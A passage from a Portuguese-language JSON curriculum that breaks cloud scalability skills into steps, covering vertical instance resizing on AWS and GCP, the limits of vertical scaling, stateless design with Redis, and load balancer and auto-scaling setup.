                                  "tips": "Use exemplos visuais para fixar diferenças; foque em cenários onde horizontal adiciona complexidade desnecessária.",
                                  "learningObjective": "Diferenciar escalabilidade vertical de horizontal e identificar contextos iniciais de viabilidade.",
                                  "commonMistakes": [
                                    "Confundir vertical com replicação de instâncias",
                                    "Ignorar custos de gerenciamento em horizontal",
                                    "Subestimar downtime durante upgrades verticais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar características de workloads adequados para escalabilidade vertical",
                                  "subSteps": [
                                    "Liste workloads monolíticos ou com forte acoplamento que não se distribuem facilmente.",
                                    "Reconheça aplicações com estado persistente, como bancos de dados relacionais sem sharding.",
                                    "Avalie workloads CPU/RAM intensivos em uma única thread, como processamento de imagens ou cálculos científicos.",
                                    "Exclua cenários de alta concorrência global que demandam distribuição geográfica.",
                                    "Classifique workloads por padrões de uso: bursty vs constante."
                                  ],
                                  "verification": "Classifique 5 workloads exemplo (ex: web app simples, ML training) como vertical ou horizontal.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Livro 'Designing Data-Intensive Applications' capítulo sobre escalabilidade",
                                    "Exemplos de workloads no Google Cloud docs",
                                    "Planilha para classificação de workloads"
                                  ],
                                  "tips": "Priorize workloads onde latência de comunicação entre instâncias supera ganhos de distribuição.",
                                  "learningObjective": "Reconhecer padrões de workloads que beneficiam de upgrades em instância única.",
                                  "commonMistakes": [
                                    "Assumir que todos os DBs escalam horizontalmente",
                                    "Ignorar gargalos de I/O em disco para vertical",
                                    "Confundir estado persistente com sessões stateless"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar cenários com estado persistente e não distribuíveis",
                                  "subSteps": [
                                    "Estude apps com dados compartilhados em memória (ex: caches locais grandes).",
                                    "Identifique cenários legados onde refatoração para stateless é cara.",
                                    "Examine workloads como ETL jobs ou relatórios batch que rodam sequencialmente.",
                                    "Considere limites de sincronização em distribuidos vs simplicidade vertical.",
                                    "Simule um cenário com ferramenta como Docker para testar estado persistente."
                                  ],
                                  "verification": "Descreva 3 cenários stateful onde vertical é ideal, justificando com métricas simuladas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Docker para simular instância única",
                                    "Artigo 'Stateful vs Stateless in Cloud' no InfoQ",
                                    "Ferramentas de profiling como New Relic demo"
                                  ],
                                  "tips": "Teste com dados reais pequenos para visualizar gargalos antes de escalar.",
                                  "learningObjective": "Aplicar conceitos a cenários reais com estado, avaliando viabilidade vertical.",
                                  "commonMistakes": [
                                    "Recomendar vertical para apps multi-tenant globais",
                                    "Esquecer backup durante upgrades",
                                    "Não considerar migração de dados em estado persistente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Considerar limites de hardware em nuvens e trade-offs",
                                  "subSteps": [
                                    "Revise specs máximas: AWS (48 TB RAM), GCP, Azure.",
                                    "Calcule limites: se workload excede max instância, vertical falha.",
                                    "Avalie trade-offs: custo, downtime, simplicidade vs disponibilidade.",
                                    "Planeje migração para horizontal quando vertical atinge limite.",
                                    "Crie checklist para decisão: custo/hora, latência, complexidade."
                                  ],
                                  "verification": "Crie checklist e aplique a um caso hipotético, decidindo vertical ou não.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Pricing calculators AWS/GCP/Azure",
                                    "Whitepaper 'Cloud Scaling Limits' da O'Reilly",
                                    "Planilha de trade-offs"
                                  ],
                                  "tips": "Sempre cheque pricing tiers; vertical é ótimo até 80% do limite max.",
                                  "learningObjective": "Integrar limites práticos em decisões de escalabilidade vertical.",
                                  "commonMistakes": [
                                    "Ignorar limites regionais de instâncias",
                                    "Subestimar custos de instâncias grandes",
                                    "Não planejar failover em monolitos verticais"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um sistema de análise de dados para uma clínica médica pequena, com banco PostgreSQL rodando queries complexas em histórico de pacientes (estado persistente), upgrade de 8GB para 64GB RAM em uma EC2 m5.4xlarge resolve lentidão sem distribuir dados sensíveis.",
                              "finalVerifications": [
                                "Liste e justifique 4 cenários adequados para vertical scaling.",
                                "Explique por que um workload específico NÃO é adequado para vertical.",
                                "Crie diagrama de decisão para escolher vertical vs horizontal.",
                                "Simule upgrade em ferramenta de nuvem e meça performance.",
                                "Compare custos de vertical max vs horizontal inicial."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de cenários (acima de 90% corretos).",
                                "Justificativas técnicas profundas com referências a limites hardware.",
                                "Uso correto de termos (stateful, monolítico, bursty).",
                                "Criatividade em exemplos reais e trade-offs considerados.",
                                "Checklist completo e aplicável a novos cenários.",
                                "Demonstração prática via simulação ou diagrama."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Software: Design monolítico vs microservices.",
                                "Banco de Dados: Escalabilidade de RDBMS vs NoSQL.",
                                "DevOps: Gerenciamento de infraestrutura como código (IaC).",
                                "Análise de Performance: Profiling e benchmarking.",
                                "Economia de Nuvem: Otimização de custos e TCO."
                              ],
                              "realWorldApplication": "Ideal para startups em fase MVP com apps web simples ou ferramentas internas de BI, onde adicionar CPU/RAM a uma VM resolve gargalos rapidamente sem engenharia distribuída complexa, comum em 70% das PMEs iniciais na AWS."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.2.1.2",
                            "name": "Configurar escalabilidade vertical em plataformas de nuvem",
                            "description": "Executar o processo de redimensionamento de instâncias em serviços como AWS EC2 (mudança de tipo de instância) ou Google Cloud Compute Engine, incluindo stop/start da VM e monitoramento de performance pré e pós-upgrade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Avaliar Necessidades e Planejar o Upgrade",
                                  "subSteps": [
                                    "Analise o uso atual de CPU, memória e disco da instância via CloudWatch (AWS) ou Monitoring (GCP).",
                                    "Identifique gargalos de performance com base em métricas como CPUUtilization > 80% por períodos prolongados.",
                                    "Selecione o novo tipo de instância compatível (ex: de t3.micro para t3.medium no AWS EC2).",
                                    "Verifique dependências como EBS volumes, Elastic IP e security groups.",
                                    "Calcule custos estimados usando AWS Pricing Calculator ou GCP Pricing."
                                  ],
                                  "verification": "Relatório de análise gerado com métricas atuais e tipo de instância alvo selecionado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Conta AWS/GCP ativa",
                                    "Acesso ao console EC2/Compute Engine",
                                    "Ferramenta de pricing calculator"
                                  ],
                                  "tips": "Sempre priorize tipos de instância com melhor custo-benefício para workloads específicos (ex: burstable para desenvolvimento).",
                                  "learningObjective": "Compreender como identificar gargalos e planejar upgrades sem interrupções desnecessárias.",
                                  "commonMistakes": [
                                    "Escolher instância incompatível com arquitetura (ARM vs x86)",
                                    "Ignorar custos de transferência de dados",
                                    "Não backupar antes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Monitoramento Pré-Upgrade",
                                  "subSteps": [
                                    "Habilite CloudWatch alarms no AWS para métricas chave (CPU, Memory, NetworkIn/Out).",
                                    "No GCP, configure Stackdriver Monitoring com dashboards personalizados.",
                                    "Colete baseline de performance por 15-30 minutos durante pico de uso.",
                                    "Configure notificações via SNS (AWS) ou Pub/Sub (GCP) para alertas.",
                                    "Teste scripts de automação para coleta de logs."
                                  ],
                                  "verification": "Dashboards de monitoramento ativos com dados baseline coletados e alarms configurados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "CloudWatch/Stackdriver acesso",
                                    "Scripts de coleta de métricas (opcional: AWS CLI ou gcloud CLI)"
                                  ],
                                  "tips": "Use métricas customizadas para memória se não nativas (instale agente CloudWatch).",
                                  "learningObjective": "Estabelecer baselines de performance para comparação pós-upgrade.",
                                  "commonMistakes": [
                                    "Monitorar apenas CPU, ignorando I/O de disco",
                                    "Não coletar dados em horários de pico",
                                    "Alarmes com thresholds irreais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar o Redimensionamento da Instância",
                                  "subSteps": [
                                    "Crie snapshot do volume EBS (AWS) ou snapshot do disco (GCP) como backup.",
                                    "Pare a instância via console ou CLI (aws ec2 stop-instances).",
                                    "Modifique o tipo de instância para o selecionado (ex: Change Instance Type).",
                                    "Inicie a instância (aws ec2 start-instances) e aguarde status 'running'.",
                                    "Reassocie Elastic IP se aplicável e teste conectividade básica (SSH/RDP)."
                                  ],
                                  "verification": "Instância rodando no novo tipo, com IP acessível e serviços iniciando normalmente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "AWS CLI ou gcloud CLI instalado",
                                    "Chaves SSH para acesso pós-start"
                                  ],
                                  "tips": "Agende em horário de baixa demanda para minimizar downtime (tipicamente 2-5 minutos).",
                                  "learningObjective": "Executar mudanças de instância com segurança e mínimo downtime.",
                                  "commonMistakes": [
                                    "Esquecer de snapshot antes de parar",
                                    "Não detachar volumes extras",
                                    "Iniciar sem verificar compatibilidade"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Monitorar e Otimizar Pós-Upgrade",
                                  "subSteps": [
                                    "Monitore métricas por 30 minutos comparando com baseline pré-upgrade.",
                                    "Ajuste configurações de aplicação se necessário (ex: aumentar workers baseados em nova CPU).",
                                    "Execute testes de load (ex: Apache Bench ou Locust) para validar performance.",
                                    "Otimize custos desligando recursos não usados ou rightsizing.",
                                    "Atualize documentação com novo setup."
                                  ],
                                  "verification": "Métricas melhoradas (ex: CPU < 50% sob load similar) e testes passando.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramentas de load testing (Locust, JMeter)",
                                    "Dashboards de monitoramento"
                                  ],
                                  "tips": "Automatize com AWS Auto Scaling ou GCP MIGs para upgrades futuros.",
                                  "learningObjective": "Validar eficácia do upgrade e iterar otimizações.",
                                  "commonMistakes": [
                                    "Não testar sob load real",
                                    "Ignorar latência de rede pós-upgrade",
                                    "Esquecer de limpar snapshots antigos"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar e Automatizar para Futuro",
                                  "subSteps": [
                                    "Registre passos executados, tempos e métricas em relatório.",
                                    "Crie playbook ou Terraform script para repetição.",
                                    "Configure Auto Scaling Group com políticas de scaling vertical.",
                                    "Compartilhe lições aprendidas com equipe.",
                                    "Revise alarms para cenários pós-upgrade."
                                  ],
                                  "verification": "Relatório completo e script de automação funcional testado.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Terraform ou AWS CDK instalado",
                                    "Ferramenta de documentação (Markdown/Notion)"
                                  ],
                                  "tips": "Use IaC (Infrastructure as Code) para tornar upgrades idempotentes.",
                                  "learningObjective": "Transformar processo manual em automatizado e replicável.",
                                  "commonMistakes": [
                                    "Documentação incompleta",
                                    "Não testar automação em ambiente dev",
                                    "Ignorar versionamento de scripts"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma aplicação web de e-commerce hospedada em AWS EC2 t3.micro com CPU frequentemente em 90% durante promoções, upgrade para t3.medium: monitore baseline, pare instância, mude tipo, inicie e valide que tempo de resposta caiu de 5s para 1s sob load de 100 users.",
                              "finalVerifications": [
                                "Instância opera no novo tipo sem erros de inicialização.",
                                "Métricas de performance melhoradas em pelo menos 30% comparado ao baseline.",
                                "Downtime total inferior a 5 minutos com dados preservados.",
                                "Testes de aplicação passam integralmente.",
                                "Custos mensais alinhados com estimativa (verificar billing dashboard).",
                                "Automação básica configurada para upgrades futuros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de gargalos (métricas corretas usadas).",
                                "Execução sem perda de dados ou configurações (snapshots válidos).",
                                "Tempo total de processo dentro de 2 horas.",
                                "Melhoria mensurável em performance pós-upgrade.",
                                "Documentação completa com lições aprendidas.",
                                "Integração com monitoramento contínuo."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD e IaC (Terraform/CloudFormation).",
                                "Gestão de Custos: Análise de TCO e otimização de billing.",
                                "Segurança: Verificação de IAM roles e security groups durante upgrade.",
                                "Desenvolvimento de Software: Tuning de aplicações para novos recursos.",
                                "Análise de Dados: Uso de métricas para decisões baseadas em evidências."
                              ],
                              "realWorldApplication": "Durante Black Friday, uma loja online escala verticalmente sua instância EC2 para lidar com 10x tráfego, reduzindo latência e evitando crashes, mantendo receita sem hiring imediato de devs."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.2.1.3",
                            "name": "Analisar limitações da escalabilidade vertical",
                            "description": "Avaliar restrições como custo crescente exponencial, limite máximo de recursos por instância, downtime durante upgrades e dependência de monolitos, comparando com alternativas horizontais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos da Escalabilidade Vertical",
                                  "subSteps": [
                                    "Defina escalabilidade vertical como o processo de adicionar mais recursos (CPU, RAM, disco) a uma única instância ou servidor.",
                                    "Explique como isso difere da escalabilidade horizontal, que envolve adicionar mais instâncias.",
                                    "Identifique cenários iniciais onde a vertical é usada, como em aplicações pequenas.",
                                    "Revise exemplos de hardware limits em provedores como AWS EC2 ou Azure VMs.",
                                    "Anote as vantagens iniciais, como simplicidade de gerenciamento."
                                  ],
                                  "verification": "Crie um diagrama simples comparando vertical vs. horizontal e liste 3 vantagens da vertical.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação AWS EC2 instance types",
                                    "Diagramas de escalabilidade (ferramentas como Draw.io)",
                                    "Artigos sobre scaling basics"
                                  ],
                                  "tips": "Use analogias como 'turbinar um carro único' vs. 'adicionar mais carros na frota'.",
                                  "learningObjective": "Entender conceitualmente a escalabilidade vertical e suas premissas iniciais.",
                                  "commonMistakes": [
                                    "Confundir vertical com horizontal",
                                    "Ignorar limites físicos de hardware",
                                    "Achar que vertical é sempre mais simples em larga escala"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Limitações de Custo e Recursos",
                                  "subSteps": [
                                    "Calcule o custo exponencial: compare preços de instâncias small vs. large (ex: t3.micro vs. m5.8xlarge na AWS).",
                                    "Pesquise limites máximos de recursos por instância (ex: 128 vCPUs, 3.9TB RAM em AWS).",
                                    "Simule crescimento: projete quando uma app com 1k users precisa de upgrade e calcule % de aumento de custo.",
                                    "Discuta diminishing returns: por que dobrar CPU nem sempre dobra performance devido a bottlenecks.",
                                    "Registre exemplos reais de vendors como Google Cloud ou Azure com limites semelhantes."
                                  ],
                                  "verification": "Tabela com 3 exemplos de custos crescentes e limites atingidos, com cálculos simples.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Calculadoras de pricing AWS/Azure/GCP",
                                    "Planilhas Excel/Google Sheets para simulações",
                                    "Benchmark reports de instâncias cloud"
                                  ],
                                  "tips": "Sempre use pricing calculators oficiais para dados reais; foque em regiões específicas.",
                                  "learningObjective": "Quantificar as restrições econômicas e técnicas da escalabilidade vertical.",
                                  "commonMistakes": [
                                    "Subestimar custos indiretos como licenças de software",
                                    "Ignorar overhead de virtualização",
                                    "Assumir performance linear com recursos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Impactos Operacionais e Dependências",
                                  "subSteps": [
                                    "Descreva downtime em upgrades: processo de stop-start de VM durante scale-up.",
                                    "Explique dependência de monolitos: apps não stateless não escalam vertical facilmente sem refatoração.",
                                    "Simule um upgrade: tempo médio de downtime (ex: 5-30 min) e riscos de falha.",
                                    "Compare com horizontal: zero-downtime via blue-green deployments.",
                                    "Liste mitigações parciais como auto-scaling groups, mas destaque suas limitações verticais."
                                  ],
                                  "verification": "Relatório curto listando 4 impactos operacionais com tempos estimados e comparações horizontais.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentos de best practices AWS para maintenance windows",
                                    "Vídeos tutoriais de VM upgrades",
                                    "Ferramentas como Terraform para simular infra"
                                  ],
                                  "tips": "Teste em uma conta free-tier para ver downtime real em uma VM pequena.",
                                  "learningObjective": "Avaliar riscos operacionais e arquiteturais da vertical.",
                                  "commonMistakes": [
                                    "Achar que live resizing elimina todo downtime",
                                    "Ignorar session stickiness em monolitos",
                                    "Subestimar complexidade de backups durante upgrades"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar com Alternativas Horizontais e Sintetizar Análise",
                                  "subSteps": [
                                    "Crie uma matriz comparativa: custo, downtime, limites, complexidade para vertical vs. horizontal.",
                                    "Discuta trade-offs: vertical para low-traffic, horizontal para high-availability.",
                                    "Avalie casos de uso: quando migrar (ex: >10k users, picos imprevisíveis).",
                                    "Sintetize limitações principais em um resumo priorizado.",
                                    "Proponha métricas para monitorar necessidade de scale (CPU>80%, custo>threshold)."
                                  ],
                                  "verification": "Matriz comparativa completa e recomendação para um cenário hipotético.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Templates de comparison matrices (Google Docs)",
                                    "Case studies de migrações (ex: AWS blogs)",
                                    "Ferramentas de monitoring como CloudWatch"
                                  ],
                                  "tips": "Priorize limitações por impacto: custo primeiro, depois downtime.",
                                  "learningObjective": "Integrar análise para decisões informadas sobre escalabilidade.",
                                  "commonMistakes": [
                                    "Recomendar vertical para tudo por 'simplicidade'",
                                    "Ignorar custos de rede em horizontal",
                                    "Não considerar hybrid approaches"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um e-commerce como uma loja online crescendo de 1k para 50k users/dia: inicialmente scale vertical adicionando RAM ao servidor principal (custo sobe 10x), mas atinge limite de 96 vCPUs com downtime de 15min em upgrade; migração para Kubernetes horizontal resolve com auto-scaling sem downtime.",
                              "finalVerifications": [
                                "Lista precisa de 4 limitações principais com exemplos quantitativos.",
                                "Matriz comparativa vertical vs. horizontal com pelo menos 5 dimensões.",
                                "Simulação de custo para um cenário de crescimento realista.",
                                "Identificação correta de downtime risks e mitigações.",
                                "Recomendação fundamentada para migrar a horizontal em casos específicos.",
                                "Uso de métricas reais de pricing de pelo menos 2 clouds."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definições e limites corretos (30%)",
                                "Análise quantitativa: cálculos de custo e simulações (25%)",
                                "Profundidade comparativa: trade-offs claros com horizontal (20%)",
                                "Exemplos práticos e verificáveis (15%)",
                                "Clareza e estrutura do relatório final (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Economia/Gestão Financeira: Análise de custos exponenciais e ROI de infra.",
                                "Administração de Empresas: Gerenciamento de riscos operacionais e downtime.",
                                "Matemática: Modelagem exponencial de crescimento e limites.",
                                "Desenvolvimento de Software: Arquitetura monolítica vs. microservices."
                              ],
                              "realWorldApplication": "Empresas como Twitter (pré-2010) usavam vertical scaling, mas migraram para horizontal após crashes famosos (Fail Whale); hoje, plataformas como Shopify usam horizontal para lidar com Black Friday peaks sem downtime ou custos proibitivos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.2.2",
                        "name": "Escalabilidade Horizontal",
                        "description": "Técnica de escalabilidade que adiciona múltiplas instâncias ou nós para distribuir a carga de trabalho, promovendo alta disponibilidade e tolerância a falhas, utilizando load balancers e auto-scaling em plataformas como AWS Auto Scaling Groups ou Kubernetes.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.2.2.1",
                            "name": "Implementar design stateless para escalabilidade horizontal",
                            "description": "Estruturar aplicações sem estado local (usando bancos de dados externos ou caches compartilhados como Redis) para permitir replicação livre de instâncias sem perda de sessão ou dados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Princípios de Design Stateful vs Stateless",
                                  "subSteps": [
                                    "Estude definições: stateful armazena dados na instância (ex: sessões em memória), stateless usa stores externos compartilhados.",
                                    "Analise trade-offs: stateless permite replicação fácil, mas introduz latência de rede.",
                                    "Revise exemplos: HTTP é stateless por natureza; compare com apps de chat stateful.",
                                    "Crie um diagrama comparativo de arquitetura stateful vs stateless.",
                                    "Identifique cenários onde stateless é essencial para escalabilidade horizontal."
                                  ],
                                  "verification": "Produza um diagrama e resumo escrito explicando diferenças e benefícios, com pelo menos 3 exemplos reais.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação AWS/Google Cloud sobre escalabilidade",
                                    "Artigos Medium sobre stateless design",
                                    "Ferramenta de diagrama como Draw.io"
                                  ],
                                  "tips": "Use analogias como 'livro de biblioteca' (stateless) vs 'anotações pessoais' (stateful) para fixar conceitos.",
                                  "learningObjective": "Diferenciar stateful e stateless, reconhecendo impactos na escalabilidade horizontal.",
                                  "commonMistakes": [
                                    "Confundir estado de sessão com cache local",
                                    "Subestimar overhead de rede em stores centralizados",
                                    "Ignorar idempotência em chamadas stateless"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Refatorar Estado Local na Aplicação Existente",
                                  "subSteps": [
                                    "Inspecione código-fonte: busque sessões em memória (ex: Express.js session middleware), variáveis de instância ou caches locais.",
                                    "Liste todos os componentes com estado: autenticação, carrinho de compras, preferências de usuário.",
                                    "Refatore para stateless: substitua por tokens JWT ou IDs de sessão armazenados externamente.",
                                    "Remova dependências de estado por instância: garanta que cada request contenha todo contexto necessário.",
                                    "Teste unitário refatoração: verifique se app funciona sem estado persistente local."
                                  ],
                                  "verification": "Execute testes unitários e confirme ausência de estado local via logs ou inspeção de código (ex: grep por sessionStore).",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Código-fonte da aplicação",
                                    "Ferramentas de linting como ESLint",
                                    "Documentação de frameworks (Node.js/Express, Spring Boot)"
                                  ],
                                  "tips": "Comece por endpoints críticos como login/logout; use profiling tools para detectar vazamentos de estado.",
                                  "learningObjective": "Auditar e eliminar estado local, preparando app para replicação horizontal.",
                                  "commonMistakes": [
                                    "Esquecer estado em middlewares globais",
                                    "Manter caches locais 'temporários'",
                                    "Não tratar falhas de rede como idempotentes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Armazenamento Centralizado de Estado com Redis",
                                  "subSteps": [
                                    "Instale e configure Redis: rode localmente ou use serviço cloud (ex: Redis Labs).",
                                    "Integre cliente Redis na app: configure store de sessões (ex: connect-redis para Express).",
                                    "Migre dados de sessão: armazene userID, token e dados essenciais como JSON serializado.",
                                    "Implemente TTL (time-to-live) para expiração automática de sessões.",
                                    "Adicione fallbacks: use DB relacional como PostgreSQL para estado persistente crítico."
                                  ],
                                  "verification": "Armazene uma sessão via app, mate instância Redis temporariamente e recupere de outra instância sem perda.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Docker para Redis local",
                                    "Biblioteca redis npm/python-redis",
                                    "Documentação Redis sessions"
                                  ],
                                  "tips": "Use chaves prefixadas como 'sess:userid' para organização; monitore memória com redis-cli info.",
                                  "learningObjective": "Configurar e integrar Redis como store compartilhado para sessões stateless.",
                                  "commonMistakes": [
                                    "Não serializar objetos complexos corretamente",
                                    "Definir TTL muito longo causando inchaço",
                                    "Expor Redis publicamente sem autenticação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar Escalabilidade Horizontal",
                                  "subSteps": [
                                    "Deploy múltiplas instâncias: use Docker Compose ou Kubernetes para 3+ réplicas atrás de load balancer.",
                                    "Simule tráfego: use ferramentas como Apache Bench ou Locust para 100+ requests simultâneos com sessões.",
                                    "Teste failover: mate instâncias aleatórias e verifique continuidade de sessões.",
                                    "Monitore métricas: latência, throughput e uso de Redis via Prometheus/Grafana.",
                                    "Otimize: ajuste configurações de conexão pool e cache invalidation."
                                  ],
                                  "verification": "Gere relatório com métricas mostrando throughput linear com + instâncias e zero perda de sessão em failover.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Docker/Kubernetes Minikube",
                                    "Locust ou JMeter para load testing",
                                    "NGINX como load balancer"
                                  ],
                                  "tips": "Inicie com load baixo e escale gradualmente; grave vídeos de testes para debug.",
                                  "learningObjective": "Validar design stateless sob carga, confirmando escalabilidade horizontal.",
                                  "commonMistakes": [
                                    "Usar load balancer sticky sessions",
                                    "Ignorar sticky bits em cookies",
                                    "Não testar cenários de partição de rede"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API de e-commerce Node.js/Express, migre gerenciamento de carrinho de sessão em memória para Redis. Usuário adiciona itens em instância A, mata A, acessa de instância B via load balancer e carrinho persiste, permitindo scale out sem downtime.",
                              "finalVerifications": [
                                "Aplicação roda em 3+ instâncias Docker sem perda de sessões ativas.",
                                "Kill de instância aleatória mantém estado via Redis (testado 10x).",
                                "Throughput dobra ao adicionar instância (medido por load test).",
                                "Latência média < 200ms sob 500 req/s.",
                                "Redis armazena < 10MB de dados de sessão com TTL funcional.",
                                "Código auditado: zero referências a estado local persistente."
                              ],
                              "assessmentCriteria": [
                                "100% dos endpoints stateless: todo estado em request ou store externo.",
                                "Integração Redis correta: conexão pool, serialização JSON, TTL configurado.",
                                "Testes de escalabilidade: métricas comprovam linearidade horizontal.",
                                "Tratamento de erros: fallbacks para Redis down sem crash da app.",
                                "Documentação: README com passos de deploy multi-instância.",
                                "Otimização: latência otimizada vs baseline stateful."
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: Modelagem NoSQL em Redis para sessões.",
                                "DevOps: Orquestração com Docker/Kubernetes para réplicas.",
                                "Segurança da Informação: Gerenciamento seguro de sessões e tokens JWT.",
                                "Engenharia de Software: Princípios SOLID e refatoração.",
                                "Análise de Performance: Monitoramento com Prometheus."
                              ],
                              "realWorldApplication": "Plataformas como Netflix e Uber usam design stateless com Redis/Cassandra para escalar horizontalmente, suportando milhões de usuários via auto-scaling groups no AWS, onde instâncias são criadas/destruídas dinamicamente sem perda de contexto de usuário."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.2.2.2",
                            "name": "Configurar load balancing e auto-scaling",
                            "description": "Configurar balanceadores de carga (ex: AWS ELB, NGINX) e grupos de auto-scaling baseados em métricas como CPU utilization, para adicionar/remover instâncias dinamicamente em resposta à demanda.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Load Balancer",
                                  "subSteps": [
                                    "Acesse a console AWS e navegue para o serviço EC2 Load Balancing.",
                                    "Crie um Application Load Balancer (ALB) selecionando o tipo apropriado (internet-facing ou internal).",
                                    "Configure listeners para portas HTTP/HTTPS (porta 80/443) e defina o VPC, subnets e security groups.",
                                    "Crie um target group associado ao ALB, especificando health checks (ex: /health na porta 80)."
                                  ],
                                  "verification": "Verifique no console se o ALB está no status 'Active' e health checks passam para targets vazios.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "Conta AWS ativa",
                                    "Console AWS EC2",
                                    "AMI de instância base (ex: Amazon Linux)"
                                  ],
                                  "tips": "Use security groups que permitam tráfego apenas das portas necessárias para minimizar exposição.",
                                  "learningObjective": "Entender os componentes básicos de um load balancer e como ele distribui tráfego inicial.",
                                  "commonMistakes": [
                                    "Esquecer de configurar health checks",
                                    "Selecionar subnets erradas (deve ser pelo menos 2 em AZs diferentes)",
                                    "Não associar security group correto"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar Launch Template para Instâncias",
                                  "subSteps": [
                                    "No console EC2, crie um Launch Template com AMI, tipo de instância (ex: t3.micro), key pair e user data script para instalar app.",
                                    "Configure security group no template permitindo tráfego do ALB (porta 80).",
                                    "Defina tags para identificação e configure storage (EBS volume).",
                                    "Salve o template e teste lançamento manual de uma instância para validar."
                                  ],
                                  "verification": "Lance uma instância manualmente do template e confirme que ela inicia corretamente com app rodando.",
                                  "estimatedTime": "30 minutes",
                                  "materials": [
                                    "Launch Template no EC2 Console",
                                    "Script user-data para app simples (ex: nginx + página HTML)"
                                  ],
                                  "tips": "Inclua user-data para pull de código de repo ou instalar dependências automaticamente.",
                                  "learningObjective": "Dominar criação de templates reutilizáveis para padronizar instâncias em scaling.",
                                  "commonMistakes": [
                                    "Não incluir key pair para acesso SSH",
                                    "Security group muito permissivo",
                                    "AMI incompatível com região"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Auto Scaling Group (ASG)",
                                  "subSteps": [
                                    "Crie um Auto Scaling Group usando o Launch Template criado.",
                                    "Selecione VPC, subnets (múltiplas AZs), defina min=1, desired=2, max=4 instâncias.",
                                    "Associe o target group do ALB ao ASG para registro automático de instâncias.",
                                    "Habilite notificações ou CloudWatch integration se necessário."
                                  ],
                                  "verification": "Confirme no console ASG que instâncias são lançadas até 'desired capacity' e registradas no target group.",
                                  "estimatedTime": "40 minutes",
                                  "materials": [
                                    "Auto Scaling Groups no EC2 Console",
                                    "Target Group do Step 1"
                                  ],
                                  "tips": "Escolha subnets públicas se ALB for internet-facing para melhor distribuição.",
                                  "learningObjective": "Implementar grupos que gerenciam lifecycle de instâncias automaticamente.",
                                  "commonMistakes": [
                                    "Definir min/max muito próximos limitando flexibilidade",
                                    "Não associar target group",
                                    "Subnets em single AZ"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Definir Políticas de Scaling Baseadas em Métricas",
                                  "subSteps": [
                                    "No ASG, crie uma política de scale-out: alarm CPU > 70% por 2 períodos de 1min, adicionar 1 instância.",
                                    "Crie scale-in: CPU < 40% por 3 períodos, remover 1 instância (warmup 300s).",
                                    "Configure CloudWatch alarms para métricas CPUUtilization do ASG.",
                                    "Teste políticas simulando carga com ferramentas como Apache Bench."
                                  ],
                                  "verification": "Simule carga alta e observe logs CloudWatch: instâncias adicionadas; reduza e veja remoção.",
                                  "estimatedTime": "50 minutes",
                                  "materials": [
